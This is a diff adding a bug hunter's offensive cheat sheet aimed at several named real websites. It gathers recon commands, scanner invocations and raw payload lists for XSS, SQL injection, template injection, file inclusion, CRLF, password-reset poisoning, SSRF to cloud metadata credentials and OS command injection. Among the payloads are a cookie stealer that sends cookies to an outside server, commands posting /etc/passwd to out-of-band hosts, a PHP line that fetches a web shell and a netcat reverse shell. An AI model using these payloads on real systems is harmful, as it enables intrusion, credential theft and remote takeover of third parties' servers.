@@ -1,0 +1,454 @@
+
+                                                                   SINGLE-RECON
+
+EXTERNAL RECON
+
+https://inteltechniques.com/tools/Domain.html
+otx.alienvault.com/indicator/domain/easybell.de
+https://web-check.as93.net/
+
+Shodan Searching 
+ssl:"X" 200 Ssl.cert.subject.CN:"easybell.de" 200
+ssl.cert.subject.CN:"*.easybell.de" http.title:"index of/"
+
+ssl.cert.subject.CN:"*.easybell.de" http.title:"gitlab"
+
+ssl.cert.subject.CN:"*.easybell.de" http.title:"gitlab"
+
+ssl.cert.subject.CN:"*.easybell.de" "230 login successful" port:"21"
+
+ssl.cert.subject.CN:"*.easybell.de"+200 http.title:"Admin" 
+
+GOOGLE DORKS
+
+go-dork -e bing -q ".php?id="
+
+go-dork -q "site:appypie.com" -p 2 -s
+
+go-dork -q "intext:'jira'" -p 5
+
+site:easybell.de
+ Dorks I always use
+
+site:*.easybell.de ext:asp
+
+site:*.easybell.de ext:jsp
+
+site:*.easybell.de ext:aspx
+
+site:*.easybell.de ext:jspx
+
+site:*.easybell.de ext:do
+
+site:*.easybell.de ext:action
+
+site:*.easybell.de ext:php
+
+PORT SCAN
+
+naabu -host easybell.de
+
+naabu -list /home/ibrahim/Arecon/ip/allip.txt -p - -exclude-ports 80,443,21,22,25 -o /home/ibrahim/Arecon/ip/ports.txt 
+
+SCAN VULNERABILITY
+
+autopwn-suite -t appypie.com
+
+echo easybell.de | naabu -nmap-cli 'nmap -sV -oX nmap-output'
+
+censys search easybell.de  | grep 'ip' | egrep -v 'description' | cut -d ':' -f2 | tr -d \'\, | grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}' | sort -u >> /home/ibrahim/Arecon/ip/sensysip.txt
+
+REMOVE CDN FROM IP
+
+cut-cdn -i /home/ibrahim/Arecon/ip/sensysip.txt | sort -u | tee -a /home/ibrahim/Arecon/ip/allip.txt
+
+URLS FINDER
+
+gospider -s "https://www.appypie.com/" -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" --other-source
+
+GITHUB DORKER
+
+https://ibrahimhaxor.github.io/gitdorker/
+
+SPIDERING
+
+python3 spidersel.py --url https://www.easybell.de/ --lowercase --include-emails
+
+TESTING XSS
+
+python3 /home/ibrahim/XSS/xss.py -u https://engineering.fb.com/?s={xss} -p /home/ibrahim/XSS/payloads1.txt
+
+<a href=”https://evil.com”>YOCLICKTHIS</href>
+XSS (Cross-Site Scripting):
+
+JavaScript://%250A0?1:import(/https:KnoXSS.me\00?1=16992/.source)//*'/*\'/*"/*\"/*`/*\`/*%26apos;)/*<!--></Title/</Style/</Script/</textArea/</iFrame/</noScript>\74k<K/contentEditable/autoFocus/OnFocus=/*${/*/;{/**/(d=document,d.body.appendChild(d.createElement(/script/.source)).src=/\\KnoXSS.me\00?1=16992/.source)}//\76-->
+
+<img src="https://cutewallpaper.org/21/wallpaper-anonymous/50+-Anonymous-Wallpaper-iPhone-on-WallpaperSafari.jpg">
+
+->test+(<script>alert(0)</script>)@example.com ->test@example(<script>alert(0)</script>).com ->"<script>alert(0)</script>"@example.com
+
+<svg/onload=confirm(1)>”@x.y
+
+<svg/onload=alert(1)>"@gmail.com
+XSS
+<h1>Hello,<script>alert("document.domain")</script>!</h1>
+
+#"></div><a href= javascript&colon;alert&lpar;document&period;domain)
+
+X-Forwarded-Host: "' or sleep(30)='"
+
+"mitsec<form/><!><detais/open/ontoggle=alert(document.domain)>"@gmail.com
+
+"><h1 style=color:red>ibrahimhaxor:)</h1>
+
+x-alert(document.domain)-'x//x
+/search/x'-alert(document.domain) - 'x//x
+<script>alert(document.domain)</script>
+
+
+ Blind XSS
+"><script src=https://haxor.bxss.in></script>
+<img src=xx onerror=alert(document.cookie)>
+
+"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vaGF4b3IuYnhzcy5pbiI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs&#61;&#61 onerror=eval(atob(this.id))>
+
+
+gospider -s "https://easybell.de" -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" --other-source | grep -e "code-200" | awk '{print $5}'| grep "=" | qsreplace -a | dalfox pipe -o result.txt
+
+
+echo https://easybell.de | gau | qsreplace abcd1234 | reflector | dalfox pipe
+
+MEGPLUS
+cd megplus
+./megplus.sh -s appypie.com 
+
+403 BYPASS
+cd dontgo40
+./dontgo403 -u https://domain.com/admin
+./dontgo403 -r request.txt
+
+WEB CACHE POISONING
+
+cd /home/ibrahim/Downloads/web-cache-vulnerability-scanner_1.1.0_linux_amd64/
+
+wcvs -u https://example.com -rr 10
+./wcvs -u https://appypie.com -f 
+
+
+JS RECON
+
+./analyzeJS.sh -d getvero.com -j -l -c -e -s -n
+
+./JSRecon -u https://www.easybell.de --show-sensitive --output results.txt --show-as-domain
+
+cat /home/ibrahim/aoutput/js.txt | eefjsf | tee -a /home/ibrahim/aoutput/js-endpoint.txt
+
+
+
+
+SQL INJECTION
+sqlmap -r jpp.txt -p commitment --force-ssl --level 5 --risk 3 --hostname --current-user --current-db --dbs --tamper=between --no-cast
+
+sqlmap -u httpx//ccc.com  --force-ssl --level 5 --risk 3 --hostname --current-user --current-db --dbs --tamper=between --no-cast
+
+4 in php
+
+"></script><script src=//haxor.bxss.in></script>
+orwa' AND (SELECT 6377 FROM (SELECT(SLEEP(5)))hLTl)--
+
+ibrahim'OR1=1#@gmail.com
+
+" OR 1-1 - "@example.com
+
+"mail'); DROP TABLE users;--"@example.com
+
+X-Forwarded-For: 0'XOR(if(now()=sysdate(),sleep(5),0))XOR'Z
+
+"XOR(if(now()=sysdate(),sleep(5),0))XOR"
+
+0'XOR(if(now()=sysdate(),sleep(5),0))XOR'Z
+0'XOR(if(now()=sysdate(),sleep(5*1),0))XOR'Z
+if(now()=sysdate(),sleep(5),0)
+
+0'XOR(if(now()=sysdate(),sleep(5),0))XOR'Z
+
+"XOR(if(now()=sysdate(),sleep(5),0))XOR"
+
+0'XOR(if(now()=sysdate(),sleep(5),0))XOR'Z
+0'XOR(if(now()=sysdate(),sleep(5*1),0))XOR'Z
+
+',0)waitfor delay'0:0:05'-- 
+
+0'XOR(if(now()=sysdate()%2Csleep(6)%2C0))XOR'Z
+
+if(now()%3dsysdate()%2csleep(0)%2c0)/*'XOR(if(now()%3dsysdate()%2csleep(0)%2c0))OR'%22XOR(if(now()%3dsysdate()%2csleep(0)%2c0)
+
+
+0'XOR(if(now()=sysdate()%2Csleep(0)%2C0))XOR'Z
+
+0"XOR(if(now()=sysdate(),sleep(12),0))XOR”Z => 12.508
+0"XOR(if(now()=sysdate(),sleep(12),0))XOR”Z => 12.543
+0"XOR(if(now()=sysdate(),sleep(0),0))XOR”Z => 0.523
+0"XOR(if(now()=sysdate(),sleep(6),0))XOR”Z => 6.565
+0"XOR(if(now()=sysdate(),sleep(3),0))XOR”Z => 3.518
+0"XOR(if(now()=sysdate(),sleep(0),0))XOR”Z => 0.502
+0"XOR(if(now()=sysdate(),sleep(12),0))XOR”Z => 12.491
+0"XOR(if(now()=sysdate(),sleep(6),0))XOR”Z => 6.508
+0"XOR(if(now()=sysdate(),sleep(0),0))XOR”Z => 0.695
+
++or+sleep(0.000000001)
+
+0'XOR(if(now()=sysdate(),sleep(5*1),0))XOR'Z
+if(now()=sysdate(),sleep(5),0)
+
+(select(0)from(select(sleep(6)))v)/*'+(select(0)from(select(sleep(6)))v)+'"+(select(0)from(select(sleep(6)))v)+"*/
+
+1 in aspx
+
+orwa';%20waitfor%20delay%20'0:0:6'%20--%20
+
+2 in graphql
+orwa') OR 11=(SELECT 11 FROM PG_SLEEP(6))--
+' or 1=1 #
+
+SSTI SERVER SIDE TEMPLATES INJECTION
+"<%= 7 * 7 %>"@example.com ->test+(${{7*7}}}@example.com
++91 97xxxx7x7;phone-context={{4*4}}{{5+5}}
+{{file_get_contents("/etc/passwd")}}
+{{7*7}}
+${7*7}
+<%= 7*7 %>
+${{7*7}}
+#{7*7}
+{{7*’7'}}
+#{ 5* 8 }
+,@(5+5)
+
+{{7*7}}
+${7*7}
+<%= 7*7 %>
+${{7*7}}
+#{7*7}
+*{7*7}
+
+
+LFI LOCAL FILE RECON
+../../../../../../../../../../../etc/passwd
+..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc..%2Fpasswd..%2F00.txt//.%00
+
+
+
+
+
+Web Cache Poisoning
+X-Forwarded-Host: a."><script>alert(1)</script>"
+
+X-Forwarded-Host: attacker.com
+X-Forwarded-Host: bing.com”>img src/onerror=prompt(document.cookie)>
+
+
+
+
+FUZZING
+
+echo https://www.easybell.de | fuzzuli -p  
+
+feroxbuster -u https://www.easybell.de  -x pdf -x js,html -x php txt json,docx
+
+dirsearch -u https://easybell.de/ -e php,asp,aspx,jsp,py,txt,conf,config,bak,backup,swp,old,db,sqlasp,aspx,aspx~,asp~,py,py~,rb,rb~,php,php~,bak,bkp,cache,cgi,conf,csv,html,inc,jar,js,json,jsp,jsp~,lock,log,rar,old,sql,sql.gz,sql.zip,sql.tar.gz,sql~,swp,swp~,tar,tar.bz2,tar.gz,txt,wadl,zip -i 200 — full-url
+
+ffuf -u https://groups.verse.me/FUZZ -w wordlist.txt -mc 200 
+
+gobuster dir -u https://buffered.io -w ~/wordlists/shortlist.txt
+
+
+SQLMAP
+
+
+sqlmap -r xx.txt --level=5 --risk=3 --dbs --dbms=mysql
+
+
+sqlmap -r acu.txt --time-sec=10 --tor --tor-type=SOCKS5 --check-tor
+
+
+CRLF INJECTION
+
+%0d%0aHTTP/1.1%20200%20OK%0d%0a%0d%0a%0d%0a%3Cscript%3Ealert(document.domain)%3C/script%3E%3C!----%3E%0d%0a
+
+PASSWORD RESET                       
+                     
+                     
+{"email":["ibrahimhaxor@gmail.com","ibrahimhaxor1@gmail.com"]}     
+    
+{"username":["ibrahimhaxor@gmail.com","ibrahimhaxor1@gmail.com"]}
+                                         
+PASSOWRD RESET POISONING                       
+X-Forwarded-For: 127.0.0.1
+-Forwarded-For: evil-website.com
+X-Forwarded-Host: evil-website.com
+X-Client-IP: evil-website.com
+X-Remote-IP: evil-website.com
+X-Remote-Addr: evil-website.com
+X-Host: evil-website.com
+
+RATELIMITE BYPASS
+
+X-Originating-IP: 127.0.0.1
+X-Forwarded-For: 127.0.0.1
+X-Remote-IP: 127.0.0.1
+X-Remote-Addr: 127.0.0.1
+X-Client-IP: 127.0.0.1
+X-Host: 127.0.0.1
+X-Forwared-Host: 127.0.0.1
+
+REMOTE CODE EXECUTION
+
+
+<?php system ('ls');?>
+<?php system ('uname -a');?>
+<?php system ('cat /etc/passwd');?>
+
+?php file_put_contents("Shell.php", file_get_contents("https://bit.ly/3nuVpHL"));?>
+
+
+OS COMMAND INJECTION
+
+`curl rqly0bzss0mv2xpc9m7v1wb8nztqhf.burpcollaborator.net`
+`curl -F shl=@/etc/passwd rqly0bzss0mv2xpc9m7v1wb8nztqhf.burpcollaborator.net`
+echo%OD%OAsleep+5
+'sleep 5'
+<?php system ('cat /etc/passwd');?>
+
+
+“<%=7*7%>”@domain.com
+2. Test+(${{5*5}})@domain.com
+
+To find SQL Inection on EmailField
+
+“‘ OR 1=1 — “‘@domain.com
+2. “mail’); DROP TABLE users; — “@domain.com
+
+To find SSRF on Email Field
+
+meow@bow123.burpcollaborator.net
+2. meow@[127.0.0.1]
+
+3. meow@[http://localhost.com]
+
+To find Parameter Pollution
+
+victim@email=attacker@domain.com
+To find Header Injection
+
+“recipent@test.com>\r\nRCPT TO:<victim+”@test.com
+2. “%0d%0aContent-Length:%200%0d%0a%0d%0a”@domain.com
+
+To find Inputfield abusing
+
+%@domain.com
+2. #@domain.com
+
+3. !@domain.com
+
+4. *@domain.com
+
+To find XSS on Email fields abusing
+
+“<svg/onload=alert(1)>”@x.y
+
+
+
+{{3*3}} = 9
+{{5*3}} = 15
+Your alert cookie with 
+{{constructor.constructor('alert(document.cookie)')()}}
+
+"mitsec<form/><!><details/open/ontoggle=alert(document.domain)>"@gmail.com
+crlf  /%E5%98%8D%E5%98%8ASet-Cookie:whoami=thecyberneh%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%BCscript%E5%98%BEalert(1);%E5%98%BC/script%E5%98%BE
+
+<iframe src=http://169.254.169.254/latest/meta-data width=500 height=500>
+
+<!--#echo var="DATE_LOCAL" -->
+
+<!--#exec cmd="mkfifo /tmp/foo;nc IP PORT 0</tmp/foo|/bin/bash 1>/tmp/foo;rm /tmp/foo" -->
+
+%n[^n]y[^j]l[^k]d[^l]h[^z]t[^k]b[^q]t[^q][^n]!%.tx
+
+" AND 4564=(SELECT 4564 FROM PG_SLEEP(11)) OR "04586"="4586--
+Path Traversals: ../../../tmp/lol.png
+SQL Injection: sleep(10) — -.jpg
+XSS: <svg onload=alert(document.comain)>.jpg/png
+Command Injection: ; sleep 10;.jpg
+
+byffyrf'OR1=1#@gmail.com
+DOS: Rename your file to a long string and upload, It may cause DOS
+
+ A=![]+'';B=!![]+'';C=[][[]]+'';F=[][C[4]+C[5]+A[2]+B[0]+A[4]+B[1]];D=F+'';F[D[3]+D[6]+C[1]+A[3]+B[0]+B[1]+C[0]+D[3]+B[0]+D[6]+B[1]](A[1]+A[2]+A[4]+B[1]+B[0]+'(1)')()
+<script>new Image().src=”http://yourserver.com/abc.php?output="+document.cookie;</script>
+
+http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance?
+curl http://169.254.169.254/metadata/v1/id
+http://169.254.169.254/metadata/v1.json
+http://169.254.169.254/metadata/v1/ 
+http://169.254.169.254/metadata/v1/id
+http://169.254.169.254/metadata/v1/user-data
+http://169.254.169.254/metadata/v1/hostname
+http://169.254.169.254/metadata/v1/region
+http://169.254.169.254/metadata/v1/interfaces/public/0/ipv6/addressAll in one request:
+curl http://169.254.169.254/metadata/v1.json | jq
+`ping $(id).ci2rij9ej7hkc9kta2h05esodtoue5a7s.oast.pro`
+`ping $(date).ci2rij9ej7hkc9kta2h05esodtoue5a7s.oast.pro`
+`ping $(pwd).ci2rij9ej7hkc9kta2h05esodtoue5a7s.oast.pro`
+`curl collaborator_dot_com`
+`curl -F shl=@/etc/passwd ci2rij9ej7hkc9kta2h05esodtoue5a7s.oast.pro`
+`echo ‘constant’ > cfile.txt | if [ $(cat cfile.txt) == ‘constant’ ]; then sleep 10; else sleep 2; fi`
+`rm cfile.txt | if [ $(cat cfile.txt) == ‘constant’ ]; then sleep 10; else sleep 2; fi`
+`if [ ‘a’ == ‘b’ ]; then sleep 0; else sleep 10; fi`
+;sleep(5)
++|+Dir c:\
+ibrahim'OR1=1#@ci2rij9ej7hkc9kta2h05esodtoue5a7s.oast.pro
+127.0.0.1 |cat /etc/passwd
+ibrahimhaxor@gmail.com;dig$(whoami).ci2rij9ej7hkc9kta2h05esodtoue5a7s.oast.pro
+;dig$(whoami).ci2rij9ej7hkc9kta2h05esodtoue5a7s.oast.pro
+`curl ci2rij9ej7hkc9kta2h05esodtoue5a7s.oast.pro`
+`curl -F shl=@/etc/passwd ci2rij9ej7hkc9kta2h05esodtoue5a7s.oast.pro`
+echo%OD%OAsleep+5
+'sleep 5'
+; EXEC xp_cmdshell 'ping ci2rij9ej7hkc9kta2h05esodtoue5a7s.oast.pro
+; curl -X POST -d @/etc/passwd http://ci2rij9ej7hkc9kta2h05esodtoue5a7s.oast.pro/ # 
+
+
+X-Forwarded-For: 0'XOR(if(now()=sysdate(),sleep(5),0))XOR'Z
+
+<?php system ('cat /etc/passwd');?>
+
+
+//....//....//....//....//....//....//....//....//....//etc/passwd
+
+%27%3E%3Ca/+/OnMOuSeOvER%0d=%0dconfirm(document.cookie)%3Ev3dm0s
+
+“><img src=x onerror=alert(document.domain)>
+
+
+https://reducted.com/gadgets/proxy/?url=file:///etc/passwd
+
+
+https://reducted.com/gadgets/proxy/?url=http://169.254.169.254/latest/meta-data
+
+
+
+List:
+① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ ⑴ ⑵ ⑶ ⑷ ⑸
+⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ ⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑
+⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚⒛ ⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧
+⒨⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ
+Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ
+Ⓜ
+Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ
+ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ ⓪
+⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ ⓵ ⓶ ⓷ ⓸
+
+°\/
+
+
+
